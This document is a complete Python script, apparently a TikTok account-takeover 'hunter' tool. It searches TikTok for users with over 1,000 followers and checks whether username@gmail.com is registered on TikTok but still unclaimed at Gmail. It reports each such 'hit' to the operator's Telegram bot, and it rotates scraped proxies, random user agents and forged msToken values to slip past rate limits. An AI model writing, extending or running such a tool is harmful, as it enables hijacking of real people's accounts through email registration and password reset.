import requests
import random
import time
import json
import string
import os
import sys
import re
from threading import Thread, Lock
from datetime import datetime
from user_agent import generate_user_agent as ua

# --- [ COLORS & THEME ] ---
P = '\x1b[1;97m'  # White
B = '\x1b[1;94m'  # Blue
O = '\x1b[1;96m'  # Cyan
Z = "\033[1;30m"  # Grey
X = '\033[1;33m'  # Yellow
F = '\033[2;32m'  # Green
Z3 = '\033[1;31m' # Red
L = "\033[1;95m"  # Pink
C = '\033[2;35m'  # Purple
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'

# Stats
lock = Lock()
stats = {
    "checked": 0,
    "tiktok_reg": 0,
    "gmail_avail": 0,
    "hits": 0,
    "proxies": 0,
    "users_found": 0
}

# --- [ AUTO PROXY & TOKEN SYSTEM ] ---
proxies_pool = []

def scrape_proxies():
    global proxies_pool
    while True:
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10).text
            with lock:
                proxies_pool = list(set(res.splitlines()))
                stats["proxies"] = len(proxies_pool)
        except: pass
        time.sleep(300)

def get_proxy():
    if not proxies_pool: return None
    p = random.choice(proxies_pool)
    return {"http": f"http://{p}", "https": f"http://{p}"}

def generate_ms_token():
    return "".join(random.choices(string.ascii_letters + string.digits, k=128))

# --- [ UI ] ---
def banner():
    sd = random.choice([J1, J2, F1, C1])
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 - 𝑽𝟔.𝟎 𝑯𝒀𝑩𝑹𝑰𝑫 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + r"""
         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝
    """ + f"""
        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑻𝑰𝑲𝑻𝑶𝑲 𝑺𝑬𝑨𝑹𝑪𝑯 + 𝑹𝑬𝑨𝑳 𝑯𝑼𝑵𝑻 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}HYBRID LOGIC: SEARCH + REG CHECK + GMAIL SIGNUP
{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J2} [ 𝑬𝑳𝑰𝑨 ] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
    """)

def update_display():
    with lock:
        c, tr, ga, h, pc, uf = stats["checked"], stats["tiktok_reg"], stats["gmail_avail"], stats["hits"], stats["proxies"], stats["users_found"]
        sys.stdout.write(f"\r{Z}[{P}{datetime.now().strftime('%H:%M:%S')}{Z}] {O}Check: {P}{c} {Z}| {F}T-Reg: {P}{tr} {Z}| {C1}G-Hit: {P}{ga} {Z}| {F}HITS: {P}{h} {Z}| {B}Users: {P}{uf} {Z}| {L}Prox: {P}{pc} ")
        sys.stdout.flush()

# --- [ HYBRID LOGIC ] ---
class HybridHunter:
    def __init__(self, token, chat_id):
        self.token = token
        self.chat_id = chat_id

    def send_hit(self, username, followers, name):
        tlg = f'''
💎 𝐇𝐘𝐁𝐑𝐈𝐃 𝐑𝐄𝐀𝐋 𝐇𝐈𝐓 💎
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
👤 𝗡𝗮𝗺𝗲 : {name}
👤 𝗨𝘀𝗲𝗿 : {username}
📧 𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers:,}
✅ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗘𝗺𝗮𝗶𝗹 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 (𝗦𝗶𝗴𝗻𝗨𝗽)
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
        '''
        try:
            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage", json={
                "chat_id": self.chat_id, "text": tlg,
                "reply_markup": {"inline_keyboard": [[{"text": "Channel", "url": "https://t.me/XRRHX"}]]}
            })
            with lock: stats["hits"] += 1
        except: pass

    def check_gmail(self, email, proxy):
        try:
            url = f"https://mail.google.com/mail/gxlu?email={email}"
            res = requests.get(url, headers={'User-Agent': ua()}, proxies=proxy, timeout=7)
            return 'Set-Cookie' not in res.headers
        except: return False

    def check_tiktok_reg(self, email, proxy):
        try:
            url = "https://www.tiktok.com/passport/email/check_email_registered"
            params = {"email": email, "aid": 1233}
            res = requests.get(url, params=params, headers={"User-Agent": ua()}, proxies=proxy, timeout=7).json()
            return res.get("is_registered") == 1
        except: return False

    def get_users_from_search(self, query, proxy):
        """Search logic from real.py to get active users"""
        try:
            url = "https://www.tiktok.com/api/search/user/full/"
            params = {
                "keyword": query,
                "count": 30,
                "cursor": 0,
                "aid": 1988,
                "msToken": generate_ms_token()
            }
            headers = {
                "User-Agent": ua(),
                "Referer": "https://www.tiktok.com/search/user?q=" + query
            }
            res = requests.get(url, params=params, headers=headers, proxies=proxy, timeout=10).json()
            return res.get("user_list", [])
        except: return []

    def start_hunting(self):
        search_keywords = ["love", "life", "gaming", "vlog", "king", "queen", "star", "official", "user", "pro"]
        while True:
            try:
                proxy = get_proxy()
                keyword = random.choice(search_keywords) + "".join(random.choices(string.ascii_lowercase, k=2))
                
                users = self.get_users_from_search(keyword, proxy)
                with lock: stats["users_found"] += len(users)
                
                for user_data in users:
                    username = user_data['user_info']['unique_id']
                    followers = user_data['user_info']['follower_count']
                    nickname = user_data['user_info']['nickname']
                    
                    if followers < 1000 or "_" in username: continue
                    
                    email = f"{username}@gmail.com"
                    with lock: stats["checked"] += 1
                    
                    # 1. Verify if registered on TikTok (Real Check)
                    if self.check_tiktok_reg(email, proxy):
                        with lock: stats["tiktok_reg"] += 1
                        
                        # 2. Verify Gmail Signup Availability
                        if self.check_gmail(email, proxy):
                            with lock: stats["gmail_avail"] += 1
                            self.send_hit(username, followers, nickname)
                    
                    update_display()
                    time.sleep(0.5)
            except: pass

if __name__ == "__main__":
    banner()
    bot_token = input(f"{P} [{F}?{P}] BOT TOKEN : ")
    chat_id = input(f"{P} [{F}?{P}] CHAT ID   : ")
    threads_num = int(input(f"{P} [{F}?{P}] THREADS   : "))
    
    Thread(target=scrape_proxies, daemon=True).start()
    print(f"{F} [!] Scraping initial proxies...{P}")
    while not proxies_pool: time.sleep(1)
    
    hunter = HybridHunter(bot_token, chat_id)
    banner()
    for _ in range(threads_num):
        Thread(target=hunter.start_hunting, daemon=True).start()
        
    while True:
        time.sleep(1)
